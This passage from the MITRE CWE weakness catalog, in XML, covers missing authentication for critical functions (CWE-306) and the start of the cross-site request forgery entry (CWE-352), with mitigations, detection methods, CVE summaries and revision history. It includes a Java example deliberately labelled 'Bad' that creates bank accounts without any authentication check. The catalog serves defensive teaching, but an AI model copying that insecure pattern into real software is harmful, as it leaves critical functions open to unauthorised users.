                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.</xhtml:p>
                  <xhtml:p>Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.</xhtml:p>
                  <xhtml:p>In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.</xhtml:p>
                  <xhtml:p>In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.5">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
	    <Mitigation>
	     <Phase>Implementation</Phase>
	     <Phase>System Configuration</Phase>
	     <Phase>Operation</Phase>
	      <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].</Description>
	    </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-5">
               <Intro_Text>In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount createBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);<xhtml:br/>
                           <xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.</Body_Text>
               <Body_Text>The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private boolean isUserAuthentic = false;<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// authenticate user,</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// if user is authenticated then set variable to true</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// otherwise set variable to false</xhtml:i>
                     <xhtml:br/>public boolean authenticateUser(String username, String password) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public BankAccount createNewBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = null;<xhtml:br/>
                           <xhtml:br/>if (isUserAuthentic) {<xhtml:div style="margin-left:1em;">account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);</xhtml:div>}<xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-155">
	      <Intro_Text>In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.</Intro_Text>
	      <Example_Code Nature="Bad" Language="Other">
                <xhtml:div>A security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]</xhtml:div>
	      </Example_Code>
	      <Body_Text>While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.</Body_Text>
	      <Example_Code Nature="Good" Language="Other">
                <xhtml:div>The sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]</xhtml:div>
	      </Example_Code>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-31260</Reference>
               <Description>Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31260</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor firmware uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30276</Reference>
               <Description>SCADA-based protocol for bridging WAN and LAN traffic has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30276</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2020-10263</Reference>
			  <Description>Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2020-10263</Link>
			</Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-23147</Reference>
			  <Description>WiFi router does not require authentication for its UART port, allowing adversaries with physical access to execute commands as root</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-23147</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1810</Reference>
               <Description>MFV. Access TFTP server without authentication and obtain configuration file with sensitive plaintext information.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6827</Reference>
               <Description>Agent software running at privileges does not authenticate incoming requests over an unprotected channel, allowing a Shatter" attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6827</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0213</Reference>
               <Description>Product enforces restrictions through a GUI but not through privileged APIs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-15483</Reference>
               <Description>monitor device allows access to physical UART debug port without authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-15483</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-9201</Reference>
               <Description>Programmable Logic Controller (PLC) does not have an authentication feature on its communication protocols.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-9201</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>No Authentication for Critical Function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 1.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 1.2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 2.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SR-2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SVV-3</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="12"/>
            <Related_Attack_Pattern CAPEC_ID="166"/>
            <Related_Attack_Pattern CAPEC_ID="216"/>
            <Related_Attack_Pattern CAPEC_ID="36"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authentication,&#34; Page 36"/>
            <Reference External_Reference_ID="REF-257"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1295"/>
            <Reference External_Reference_ID="REF-1296"/>
            <Reference External_Reference_ID="REF-1297"/>
            <Reference External_Reference_ID="REF-1298"/>
            <Reference External_Reference_ID="REF-1302"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2010-02-16">No Authentication for Critical Function</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="352" Name="Cross-Site Request Forgery (CSRF)" Abstraction="Compound" Structure="Composite" Status="Stable">
         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.</Description>
         <Extended_Description>When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="642" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="613" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Session Riding</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross Site Reference Forgery</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>XSRF</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.</xhtml:p>
                  <xhtml:p>Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.</Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330]</xhtml:p>
                  <xhtml:p>Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use the "double-submitted cookie" method as described by Felten and Zeller:</xhtml:p>
                  <xhtml:p>When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.</xhtml:p>
